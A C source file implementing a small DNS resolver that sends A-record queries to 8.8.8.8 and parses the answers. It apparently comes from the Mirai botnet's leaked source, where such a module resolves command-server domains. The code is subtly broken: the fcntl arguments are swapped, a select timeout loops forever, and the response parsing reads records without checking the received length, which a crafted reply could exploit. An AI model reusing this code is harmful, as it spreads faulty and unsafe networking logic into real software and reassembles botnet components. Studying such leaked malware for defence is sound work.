#define _GNU_SOURCE

#ifdef DEBUG
#include <stdio.h>
#endif
#include <stdint.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <fcntl.h>
#include <errno.h>

#include "includes.h"
#include "util.h"
#include "rand.h"
#include "resolv.h"
#include "protocol.h"

void resolv_domain_to_hostname(char *dst_hostname, char *src_domain)
{
    int len = util_strlen(src_domain) + 1;
    char *lbl = dst_hostname, *dst_pos = dst_hostname + 1;
    uint8_t curr_len = 0;

    while (len-- > 0)
    {
        char c = *src_domain++;

        if (c == '.' || c == 0)
        {
            *lbl = curr_len;
            lbl = dst_pos++;
            curr_len = 0;
        }
        else
        {
            curr_len++;
            *dst_pos++ = c;
        }
    }
    *dst_pos = 0;
}

static void resolv_skip_name(uint8_t *reader, uint8_t *buffer, int *count)
{
    unsigned char *start;
    start = reader;

    if (*reader == 0)
    {
        *count = 1;
        return;
    }

    while (1)
    {
        if ((*reader & 0xC0) == 0xC0)
        {
            *count = (reader - start) + 2;
            return;
        }

        if (*reader == 0)
        {
            *count = (reader - start) + 1;
            return;
        }
        reader = reader + 1;
        reader = reader + (*reader);
    }
}

struct resolv_entries *resolv_lookup(char *domain)
{
    struct resolv_entries *entries = calloc(1, sizeof (struct resolv_entries));
    char query[2048], response[2048];
    struct dnshdr *dnsh = (struct dnshdr *)query;
    char *qname = (char *)(dnsh + 1);

    resolv_domain_to_hostname(qname, domain);

    struct dns_question *dnst = (struct dns_question *)(qname + util_strlen(qname) + 1);
    struct sockaddr_in addr = {0};
    int query_len = sizeof (struct dnshdr) + util_strlen(qname) + 1 + sizeof (struct dns_question);
    int tries = 0, fd = -1, i = 0;
    uint16_t dns_id = rand_next() % 0xffff;

    util_zero(&addr, sizeof (struct sockaddr_in));
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = INET_ADDR(8,8,8,8);
    addr.sin_port = htons(53);

    
    dnsh->id = dns_id;
    dnsh->opts = htons(1 << 8); 
    dnsh->qdcount = htons(1);
    dnst->qtype = htons(PROTO_DNS_QTYPE_A);
    dnst->qclass = htons(PROTO_DNS_QCLASS_IP);

    while (tries++ < 5)
    {
        fd_set fdset;
        struct timeval timeo;
        int nfds;

        if (fd != -1)
            close(fd);

        if ((fd = socket(AF_INET, SOCK_DGRAM, 0)) == -1)
        {
            #ifdef DEBUG
                printf("[resolv] Failed to create socket\n");
            #endif
            sleep(1);
            continue;
        }

        if (connect(fd, (struct sockaddr *)&addr, sizeof (struct sockaddr_in)) == -1)
        {
            #ifdef DEBUG
                printf("[resolv] Failed to call connect on udp socket\n");
            #endif
            sleep(1);
            continue;
        }

        if (send(fd, query, query_len, MSG_NOSIGNAL) == -1)
        {
            #ifdef DEBUG
                printf("[resolv] Failed to send packet: %d\n", errno);
            #endif
            sleep(1);
            continue;
        }

        fcntl(F_SETFL, fd, O_NONBLOCK | fcntl(F_GETFL, fd, 0));

        while (1)
        {
            int ret;

            FD_ZERO(&fdset);
            FD_SET(fd, &fdset);

            timeo.tv_sec = 1;
            timeo.tv_usec = 0;

            nfds = select(fd + 1, &fdset, NULL, NULL, &timeo);
            if (nfds == -1)
            {
                #ifdef DEBUG
                    printf("[resolv] Failed to call select() on socket\n");
                #endif
                sleep(1);
                continue;
            }
            if (nfds > 0)
            {
                if ((ret = recv(fd, response, sizeof (response), MSG_NOSIGNAL)) == -1)
                {
                    #ifdef DEBUG
                        printf("[resolv] Failed to recv() response\n");
                    #endif
                    sleep(1);
                    continue;
                }

                if (ret < (sizeof (struct dnshdr) + util_strlen(qname) + 1 + sizeof (struct dns_question)))
                    continue;

                dnsh = (struct dnshdr *)response;
                qname = (char *)(dnsh + 1);
                dnst = (struct dns_question *)(qname + util_strlen(qname) + 1);
                
                if (dnsh->id != dns_id)
                    continue;
                if (dnsh->ancount == 0)
                    continue;

                int ancount = ntohs(dnsh->ancount);
                char *name = (char *)(dnst + 1);

                while (ancount-- > 0)
                {
                    struct dns_resource *r_data = NULL;
                    int stop = 0;

                    resolv_skip_name((uint8_t *)name, (uint8_t *)response, &stop);
                    name = name + stop;

                    r_data = (struct dns_resource *)name;
                    name = name + sizeof(struct dns_resource);

                    if (r_data->type == htons(PROTO_DNS_QTYPE_A) && r_data->_class == htons(PROTO_DNS_QCLASS_IP))
                    {
                        if (ntohs(r_data->data_len) == 4)
                        {
                            uint32_t *p;
                            uint8_t tmp_buf[4];
                            for(i = 0; i < 4; i++)
                                tmp_buf[i] = name[i];

                            p = (uint32_t *)tmp_buf;

                            entries->addrs = realloc(entries->addrs, (entries->addrs_len + 1) * sizeof (ipv4_t));
                            entries->addrs[entries->addrs_len++] = (*p);
                            #ifdef DEBUG
                                printf("[resolv] Found IP address: %d.%d.%d.%d\n", CONVERT_ADDR(*p));
                            #endif
                        }

                        name = name + ntohs(r_data->data_len);
                    } else {
                        resolv_skip_name((uint8_t *)name, (uint8_t *)response, &stop);
                        name = name + stop;
                    }
                }

                break;
            }
        }

        break;
    }

    close(fd);

    #ifdef DEBUG
        printf("[resolv] Resolved %s to %d IPv4 addresses\n", domain, entries->addrs_len);
    #endif

    if (entries->addrs_len > 0)
        return entries;
    else
    {
        resolv_entries_free(entries);
        return NULL;
    }
}

void resolv_entries_free(struct resolv_entries *entries)
{
    if (entries == NULL)
        return;
    if (entries->addrs != NULL)
        free(entries->addrs);
    free(entries);
}
